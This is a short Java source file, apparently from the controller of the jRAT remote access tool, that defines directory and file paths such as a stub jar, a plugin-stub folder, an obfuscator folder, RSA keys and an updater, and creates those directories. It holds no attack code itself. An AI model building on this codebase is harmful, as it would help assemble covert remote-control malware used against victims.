package se.jrat.controller;

import java.io.File;

public class Globals {

	public static final File getFileDirectory() {
		return new File("files/");
	}

	public static final File getHelpDocDirectory() {
		return new File(getFileDirectory(), "help/");
	}

	public static final File getZKMDirectory() {
		return new File(getFileDirectory(), "zkm/");
	}

	public static final File getPluginDirectory() {
		return new File(getFileDirectory(), "plugins/");
	}

	public static final File getPluginStubDirectory() {
		return new File(getPluginDirectory(), "stubs/");
	}
	
	public static final File getNotesDirectory() {
		return new File(getFileDirectory(), "notes/");
	}
	
	public static final File getSettingsDirectory() {
		return new File(getFileDirectory(), "settings/");
	}
	
	public static final File getRSAKeysDirectory() {
		return new File(getFileDirectory(), "rsakeys/");
	}
	
	public static final File getLibDirectory() {
		return new File(getFileDirectory(), "lib/");
	}
	
	public static final File getStub() {
		return new File(getFileDirectory(), "Stub.jar");
	}
	
	public static final File getKeyFile() {
		return getKeyFile("");
	}
	
	public static final File getKeyFile(String nr) {
		return new File(getFileDirectory(), "jrat" + nr + ".key");
	}
	
	public static final File getUpdater() {
		return new File(getFileDirectory(), "Updater.jar");
	}
	
	public static void mkdirs() {
		getFileDirectory().mkdirs();
		getHelpDocDirectory().mkdirs();
		getZKMDirectory().mkdirs();
		getPluginDirectory().mkdirs();
		getPluginStubDirectory().mkdirs();
		getNotesDirectory().mkdirs();
		getSettingsDirectory().mkdirs();
		getRSAKeysDirectory().mkdirs();
		getLibDirectory().mkdirs();
	}
}
